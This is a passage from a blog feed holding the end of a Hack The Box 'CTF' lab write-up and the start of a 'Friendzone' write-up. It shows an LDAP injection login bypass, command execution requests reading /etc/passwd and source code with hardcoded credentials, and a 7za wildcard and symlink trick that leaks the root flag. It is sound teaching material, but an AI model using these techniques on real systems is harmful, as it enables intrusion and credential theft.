&lt;h4 id=&quot;2a2928uid3d2a2929287c28uid3d2a-is-uiduid-url-encoded&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;%2a%29%28uid%3d%2a%29%29%28%7c%28uid%3d%2a&lt;/code&gt; is &lt;code class=&quot;highlighter-rouge&quot;&gt;*)(uid=*))(|(uid=*&lt;/code&gt; url-encoded.&lt;/h4&gt;
&lt;h4 id=&quot;it-redirected-me-to-pagephp-which-i-can-use-to-execute-commands-&quot;&gt;It redirected me to &lt;code class=&quot;highlighter-rouge&quot;&gt;/page.php&lt;/code&gt; which I can use to execute commands :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ctf/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-tried-whoami-and-it-worked-fine&quot;&gt;I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;whoami&lt;/code&gt; and it worked fine:&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ctf/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;i-switched-to-burp-to-make-things-easier-i-wanted-to-read-etcpasswd-to-know-the-users-&quot;&gt;I switched to burp to make things easier, I wanted to read &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; to know the users :&lt;/h4&gt;
&lt;h4 id=&quot;request--1&quot;&gt;Request :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /page.php HTTP/1.1
Host: ctf.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://ctf.htb/page.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Cookie: PHPSESSID=jj0dlekfhl2pggbo50bg4dkeu0
Connection: close
Upgrade-Insecure-Requests: 1

inputCmd=cat /etc/passwd&amp;amp;inputOTP=52447058

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;response--1&quot;&gt;Response :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 200 OK
Date: Fri, 19 Jul 2019 21:58:13 GMT
Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16
X-Powered-By: PHP/5.4.16
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Length: 4005
Connection: close
Content-Type: text/html; charset=UTF-8

&lt;span class=&quot;cp&quot;&gt;&amp;lt;!doctype html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;lang=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;en&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
        ----------------
         Removed Output
        ----------------
&lt;span class=&quot;nt&quot;&gt;&amp;lt;pre&amp;gt;&lt;/span&gt;root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
libstoragemgmt:x:998:997:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin
abrt:x:173:173::/etc/abrt:/sbin/nologin
rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
chrony:x:997:995::/var/lib/chrony:/sbin/nologin
tcpdump:x:72:72::/:/sbin/nologin
ldap:x:55:55:OpenLDAP server:/var/lib/ldap:/sbin/nologin
saslauth:x:996:76:Saslauthd user:/run/saslauthd:/sbin/nologin
ldapuser:x:1000:1000::/home/ldapuser:/bin/bash
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/pre&amp;gt;&lt;/span&gt;
        ----------------
         Removed Output
        ----------------
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-can-see-that-ldapuser-is-an-actual-user-on-the-box-i-tried-to-get-a-reverse-shell-but-for-some-reason-i-couldnt-get-a-reverse-shell-at-all-so-i-started-to-look-in-the-web-files-i-was-already-in-the-web-directory-&quot;&gt;We can see that &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser&lt;/code&gt; is an actual user on the box, I tried to get a reverse shell but for some reason I couldn’t get a reverse shell at all so I started to look in the web files. I was already in the web directory :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;inputCmd=pwd&amp;amp;inputOTP=14546713

/var/www/html
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-listed-the-files-&quot;&gt;I listed the files :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;inputCmd=ls -la&amp;amp;inputOTP=14546713

total 36
drwxr-xr-x. 6 root   root    176 Oct 23  2018 .
drwxr-xr-x. 4 root   root     33 Jun 27  2018 ..
-rw-r--r--. 1 root   root      0 Jul 20 00:03 banned.txt
-rw-r-----. 1 root   apache 1424 Oct 23  2018 cover.css
drwxr-x--x. 2 root   apache 4096 Oct 23  2018 css
drwxr-x--x. 4 root   apache   27 Oct 23  2018 dist
-rw-r-----. 1 root   apache 2592 Oct 23  2018 index.html
drwxr-x--x. 2 root   apache  242 Oct 23  2018 js
-rw-r-----. 1 root   apache 5021 Oct 23  2018 login.php
-rw-r-----. 1 root   apache   68 Oct 23  2018 logout.php
-rw-r-----. 1 root   apache 5245 Oct 23  2018 page.php
-rw-r-----. 1 root   apache 2324 Oct 23  2018 status.php
drwxr-x--x. 2 apache apache    6 Oct 23  2018 uploads
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-started-looking-for-any-hardcoded-credentials-in-the-php-files-in-loginphp-i-found-credentials-for-ldapuser-&quot;&gt;I started looking for any hardcoded credentials in the &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; files, in &lt;code class=&quot;highlighter-rouge&quot;&gt;login.php&lt;/code&gt; I found credentials for &lt;code class=&quot;highlighter-rouge&quot;&gt;ldapuser&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;inputCmd=cat login.php&amp;amp;inputOTP=04181897

&amp;lt;?php
session_start();
$strErrorMsg=&quot;&quot;;

$username = 'ldapuser';
$password = 'e398e27d5c4ad45086fe431120932a01';

$basedn = 'dc=ctf,dc=htb';
$usersdn = 'cn=users';

// This code uses the START_TLS command

$ldaphost = &quot;ldap://ctf.htb&quot;;
$ldapUsername  = &quot;cn=$username&quot;;

$ds = ldap_connect($ldaphost);
$dn = &quot;uid=ldapuser,ou=People,dc=ctf,dc=htb&quot;;

if (!empty($_POST))
{
    //var_dump($_POST);
    $username1 = $_POST['inputUsername'];
    $OPT1 = $_POST['inputOTP'];

    $regex='/[()*&amp;amp;|!=&amp;gt;&amp;lt;~]/';

    if (!preg_match($regex, $username1)) {
        $username2 = urldecode($username1);

        if(!ldap_set_option($ds, LDAP_OPT_PROTOCOL_VERSION, 3)){
            print &quot;Could not set LDAPv3\r\n&quot;;
        }
        else if (!ldap_start_tls($ds)) {
           print &quot;Could not start secure TLS connection&quot;;
        }
        else {
            // now we need to bind to the ldap server
            $bth = ldap_bind($ds, $dn, $password) or die(&quot;\r\nCould not connect to LDAP server\r\n&quot;);

            $filter = &quot;(&amp;amp;(objectClass=inetOrgPerson)(uid=$username2))&quot;;
            // fix to be sure that the user has a token string in the db. Without it you can bypass the OTP check with no token in the input form!
            $filter = &quot;(&amp;amp;(&amp;amp;(objectClass=inetOrgPerson)(uid=$username2))(pager=*))&quot;;
            //echo $filter.PHP_EOL;
            if ($search=@ldap_search($ds, $basedn, $filter)) {
                $info = ldap_get_entries($ds, $search);

                if($info[&quot;count&quot;] &amp;gt; 0) {
                    $token_string = $info[0]['pager'][0];
                    //echo $token_string;
                    $token = exec(&quot;/usr/bin/stoken --token=$token_string --pin=0000&quot;);
                    if($token == $OPT1) {
                        $strErrorMsg = &quot;Login ok&quot;;
                        $_SESSION['username'] = $username1;
                        header ('Location: /page.php');
                    }
                    else {
                        $strErrorMsg = &quot;Cannot login&quot;;
                    }
                }
                else {
                    $strErrorMsg = &quot;User $username1 not found&quot;;
                }
            }
        }
    }
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;-ldapuser--e398e27d5c4ad45086fe431120932a01&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt; ldapuser : e398e27d5c4ad45086fe431120932a01&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;ssh-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ctf/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-owned-user&quot;&gt;We owned user.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;7z-list-files-and-wildcards-root-flag&quot;&gt;7z List Files and Wildcards, Root Flag&lt;/h3&gt;
&lt;h4 id=&quot;before-enumerating-anything-i-just-checked-the-directories-and-stuff-like-that-in--i-saw-a-directory-called-backup&quot;&gt;Before enumerating anything I just checked the directories and stuff like that, in &lt;code class=&quot;highlighter-rouge&quot;&gt;/&lt;/code&gt; I saw a directory called &lt;code class=&quot;highlighter-rouge&quot;&gt;backup&lt;/code&gt;&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[ldapuser@ctf /]$ ls -al
total 32
dr-xr-xr-x.  18 root root  238 Jul 31  2018 .
dr-xr-xr-x.  18 root root  238 Jul 31  2018 ..
drwxr-xr-x.   2 root root 4096 Jul 20 00:07 backup
lrwxrwxrwx.   1 root root    7 Jul 30  2018 bin -&amp;gt; usr/bin
dr-xr-xr-x.   5 root root 4096 Oct 16  2018 boot
drwxr-xr-x.  20 root root 3180 Jul 19 23:34 dev
drwxr-xr-x.  90 root root 8192 Dec  9  2018 etc
drwxr-xr-x.   3 root root   22 Jul 30  2018 home
lrwxrwxrwx.   1 root root    7 Jul 30  2018 lib -&amp;gt; usr/lib
lrwxrwxrwx.   1 root root    9 Jul 30  2018 lib64 -&amp;gt; usr/lib64
drwxr-xr-x.   2 root root    6 Apr 11  2018 media
drwxr-xr-x.   2 root root    6 Apr 11  2018 mnt
drwxr-xr-x.   3 root root   16 Jul 30  2018 opt
dr-xr-xr-x. 119 root root    0 Jul 19 23:33 proc
dr-xr-x---.   7 root root 4096 Dec  9  2018 root
drwxr-xr-x.  31 root root  920 Jul 19 23:34 run
lrwxrwxrwx.   1 root root    8 Jul 30  2018 sbin -&amp;gt; usr/sbin
drwxr-xr-x.   2 root root    6 Apr 11  2018 srv
dr-xr-xr-x.  13 root root    0 Jul 19 23:34 sys
drwxrwxrwt.  10 root root 4096 Jul 20 00:06 tmp
drwxr-xr-x.  13 root root  155 Jul 30  2018 usr
drwxr-xr-x.  21 root root 4096 Jul 30  2018 var
[ldapuser@ctf /]$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;it-had-a-lot-of-archives-an-error-log-and-a-script-called-honeypotsh-&quot;&gt;It had a lot of archives, an error log and a script called &lt;code class=&quot;highlighter-rouge&quot;&gt;honeypot.sh&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[ldapuser@ctf backup]$ ls -al
total 52
drwxr-xr-x.  2 root root 4096 Jul 20 00:07 .
dr-xr-xr-x. 18 root root  238 Jul 31  2018 ..
-rw-r--r--.  1 root root   32 Jul 19 23:57 backup.1563573421.zip
-rw-r--r--.  1 root root   32 Jul 19 23:58 backup.1563573481.zip
-rw-r--r--.  1 root root   32 Jul 19 23:59 backup.1563573541.zip
-rw-r--r--.  1 root root   32 Jul 20 00:00 backup.1563573602.zip
-rw-r--r--.  1 root root   32 Jul 20 00:01 backup.1563573661.zip
-rw-r--r--.  1 root root   32 Jul 20 00:02 backup.1563573721.zip
-rw-r--r--.  1 root root   32 Jul 20 00:03 backup.1563573781.zip
-rw-r--r--.  1 root root   32 Jul 20 00:04 backup.1563573841.zip
-rw-r--r--.  1 root root   32 Jul 20 00:05 backup.1563573901.zip
-rw-r--r--.  1 root root   32 Jul 20 00:06 backup.1563573961.zip
-rw-r--r--.  1 root root   32 Jul 20 00:07 backup.1563574022.zip
-rw-r--r--.  1 root root    0 Jul 20 00:07 error.log
-rwxr--r--.  1 root root  975 Oct 23  2018 honeypot.sh
[ldapuser@ctf backup]$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;honeypotsh-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;honeypot.sh&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[ldapuser@ctf backup]$ cat honeypot.sh 
# get banned ips from fail2ban jails and update banned.txt
# banned ips directily via firewalld permanet rules are **not** included in the list (they get kicked for only 10 seconds)
/usr/sbin/ipset list | grep fail2ban -A 7 | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | sort -u &amp;gt; /var/www/html/banned.txt
# awk '$1=$1' ORS='&amp;lt;br&amp;gt;' /var/www/html/banned.txt &amp;gt; /var/www/html/testfile.tmp &amp;amp;&amp;amp; mv /var/www/html/testfile.tmp /var/www/html/banned.txt

# some vars in order to be sure that backups are protected
now=$(date +&quot;%s&quot;)
filename=&quot;backup.$now&quot;
pass=$(openssl passwd -1 -salt 0xEA31 -in /root/root.txt | md5sum | awk '{print $1}')

# keep only last 10 backups
cd /backup
ls -1t *.zip | tail -n +11 | xargs rm -f

# get the files from the honeypot and backup 'em all
cd /var/www/html/uploads
7za a /backup/$filename.zip -t7z -snl -p$pass -- *

# cleaup the honeypot
rm -rf -- *

# comment the next line to get errors for debugging
truncate -s 0 /backup/error.log
[ldapuser@ctf backup]$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;obviously-this-script-runs-from-time-to-time-to-backup-files-also-its-running-as-root-i-didnt-check-cronjobs-or-use-pspy-it-was-obvious-since-its-accessing-rootroottxt-to-create-the-password-and-only-root-can-access-that&quot;&gt;Obviously this script runs from time to time to backup files, also it’s running as root. I didn’t check cronjobs or use &lt;code class=&quot;highlighter-rouge&quot;&gt;pspy&lt;/code&gt;, it was obvious since it’s accessing &lt;code class=&quot;highlighter-rouge&quot;&gt;/root/root.txt&lt;/code&gt; to create the password and only root can access that.&lt;/h4&gt;
&lt;h4 id=&quot;basically-one-of-the-things-that-this-script-is-doing-is-that-its-backing-up-all-the-files-in-varwwwhtmluploads-by-using-7za-to-put-all-the-uploads-in-one-archive-lets-look-at-the-command-again-&quot;&gt;Basically one of the things that this script is doing is that it’s backing up all the files in &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html/uploads&lt;/code&gt; by using &lt;code class=&quot;highlighter-rouge&quot;&gt;7za&lt;/code&gt; to put all the uploads in one archive. Let’s look at the command again :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;7za a /backup/$filename.zip -t7z -snl -p$pass -- *&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-using-the-wildcard-asterisk--to-get-all-files-this-means-that-if-we-can-write-to-varwwwhtmluploads-our-file-will-be-included-in-the-command-if-we-can-create-a-malicious-file-name-then-we-can-somehow-manipulate-the-7za-command&quot;&gt;It’s using the wildcard asterisk (&lt;code class=&quot;highlighter-rouge&quot;&gt;*&lt;/code&gt;) to get all files. This means that if we can write to &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html/uploads&lt;/code&gt; our file will be included in the command. If we can create a malicious file name then we can somehow manipulate the &lt;code class=&quot;highlighter-rouge&quot;&gt;7za&lt;/code&gt; command.&lt;/h4&gt;
&lt;h4 id=&quot;its-also-using-this-option---snl-i-checked-the-manual-page-for-7za-&quot;&gt;It’s also using this option : &lt;code class=&quot;highlighter-rouge&quot;&gt;-snl&lt;/code&gt;, I checked the manual page for &lt;code class=&quot;highlighter-rouge&quot;&gt;7za&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;       -snl   Store symbolic links as links
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;note-that-we-cant-unzip-the-created-backups-so-even-if-we-created-a-symlink-to-roottxt-in-varwwwhtmluploads-we-wont-be-able-to-read-it-because-the-archive-is-password-protected-the-only-way-to-actually-get-anything-is-through-the-error-log-we-need-to-cause-an-error-that-somehow-leaks-the-flag&quot;&gt;Note that we can’t unzip the created backups, so even if we created a symlink to &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html/uploads&lt;/code&gt; we won’t be able to read it because the archive is password protected. The only way to actually get anything is through the error log, we need to cause an error that somehow leaks the flag.&lt;/h4&gt;
&lt;h4 id=&quot;after-searching-for-some-time-i-found-this-page-which-talks-about-a-feature-in-7z-called-list-files-i-thought-if-i-created-2-files-roottxt-and-roottxt-roottxt-is-a-symlink-to-rootroottxt-when-the-command-is-executed-and-gets-to-roottxt-it-will-treat-that-as-a-list-file-option-then-it-will-search-for-roottxt-to-use-it-as-a-list-file-however-that-file-isnt-a-real-list-file-that-may-cause-an-error-also-its-a-symlink-to-rootroottxt&quot;&gt;After searching for some time I found &lt;a href=&quot;https://sevenzip.osdn.jp/chm/cmdline/syntax.htm&quot;&gt;this page&lt;/a&gt; which talks about a feature in &lt;code class=&quot;highlighter-rouge&quot;&gt;7z&lt;/code&gt; called list files. I thought if I created 2 files, &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;@root.txt&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt; is a &lt;code class=&quot;highlighter-rouge&quot;&gt;symlink&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;/root/root.txt&lt;/code&gt;, when the command is executed and gets to &lt;code class=&quot;highlighter-rouge&quot;&gt;@root.txt&lt;/code&gt; it will treat that as a list file option then it will search for &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt; to use it as a list file. However that file isn’t a real list file (that may cause an error), also it’s a &lt;code class=&quot;highlighter-rouge&quot;&gt;symlink&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;/root/root.txt&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;i-went-to-varwwwhtmluploads-and-i-didnt-even-have-read-access&quot;&gt;I went to &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html/uploads&lt;/code&gt; and I didn’t even have read access.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[ldapuser@ctf backup]$ cd /var/www/html/uploads/
[ldapuser@ctf uploads]$ ls -al
ls: cannot open directory .: Permission denied
[ldapuser@ctf uploads]$ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;so-i-went-back-to-the-rce-requests-in-burp-and-tried-as-apache&quot;&gt;so I went back to the &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt; requests in burp and tried as &lt;code class=&quot;highlighter-rouge&quot;&gt;apache&lt;/code&gt;.&lt;/h4&gt;
&lt;h4 id=&quot;i-created-a-symlink-to-rootroottxt-as-roottxt-&quot;&gt;I created a &lt;code class=&quot;highlighter-rouge&quot;&gt;symlink&lt;/code&gt; to &lt;code class=&quot;highlighter-rouge&quot;&gt;/root/root.txt&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;root.txt&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;inputCmd=ln -s /root/root.txt uploads/root.txt&amp;amp;inputOTP=91913130
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;then-i-created-an-empty-file-and-called-it-roottxt-&quot;&gt;Then I created an empty file and called it &lt;code class=&quot;highlighter-rouge&quot;&gt;@root.txt&lt;/code&gt; :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;inputCmd=touch uploads/@root.txt&amp;amp;inputOTP=91913130
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;lets-check-the-directory-listing-now-&quot;&gt;Let’s check the directory listing now :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;inputCmd=ls -la uploads&amp;amp;inputOTP=91913130

total 0
drwxr-x--x. 2 apache apache  39 Jul 20 01:12 .
drwxr-xr-x. 6 root   root   176 Oct 23  2018 ..
-rw-r--r--. 1 apache apache   0 Jul 20 01:12 @root.txt
lrwxrwxrwx. 1 apache apache  14 Jul 20 01:12 root.txt -&amp;gt; /root/root.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;everything-is-fine-lets-check-the-error-log-&quot;&gt;Everything is fine let’s check the error log :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/ctf/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---friendzone&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/friendzone/&quot;&gt;Hack The Box - Friendzone&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Web" /><category term="RCE" /><category term="php" /><category term="ssh" /><category term="Python" /><category term="Exploit Development" /><category term="ldap" /><category term="code analysis" /><summary type="html">Quick Summary Hey guys today CTF retired and here’s my write-up about it. CTF was a very cool box, it had an ldap injection vulnerability which I have never seen on another box before, and the way of exploiting that vulnerability to gain access was great. A really unique box, I had fun solving it and I hope you have fun too reading my write-up. It’s a Linux box and its ip is 10.10.10.122, I added it to /etc/hosts as ctf.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC ctf.htb Only http on port 80 and ssh on port 22 HTTP Initial Enumeration http://ctf.htb It’s pretty straightforward that we will get banned for 5 minutes if we tried to bruteforce anything, like sub directories for example. It’s also saying that they handle authentication with tokens, There’s a login page so let’s take a look at it. We need a username and an OTP (one-time password). An OTP is time limited which means that even if we could get a valid one it will give us access only once because it expires in a short time (usually 60 seconds). So we need to gain access to a place that generates valid OTPs or to be able to generate valid OTPs ourselves. Let’s take a look at the source code of the login page, maybe something is there : ``` &amp;lt;!doctype html&amp;gt;</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/ctf/0.png" /></entry><entry><title type="html">Hack The Box - Friendzone</title><link href="http://localhost:4000/hack-the-box/friendzone/" rel="alternate" type="text/html" title="Hack The Box - Friendzone" /><published>2019-07-13T00:00:00+02:00</published><updated>2019-07-13T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/friendzone</id><content type="html" xml:base="http://localhost:4000/hack-the-box/friendzone/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-friendzone-retired-and-heres-my-write-up-about-it-friendzone-was-a-very-nice-and-easy-box-i-enjoyed-solving-it-and-i-really-liked-it-it-had-a-lot-of-funny-parts-as-well-its-a-linux-box-and-its-ip-is-101010123-i-added-it-to-etchosts-as-friendzonehtb-lets-jump-right-in-&quot;&gt;Hey guys today Friendzone retired and here’s my write-up about it. Friendzone was a very nice and easy box. I enjoyed solving it and I really liked it, it had a lot of funny parts as well. It’s a Linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.123&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;friendzone.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/friendzone/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT friendzone.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/friendzone/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;note--i-didnt-do-a-script-scan--sc-because-for-some-reason-it-took-a-lot-of-time-and-didnt-finish&quot;&gt;Note : I didn’t do a script scan (&lt;code class=&quot;highlighter-rouge&quot;&gt;-sC&lt;/code&gt;) because for some reason it took a lot of time and didn’t finish.&lt;/h4&gt;
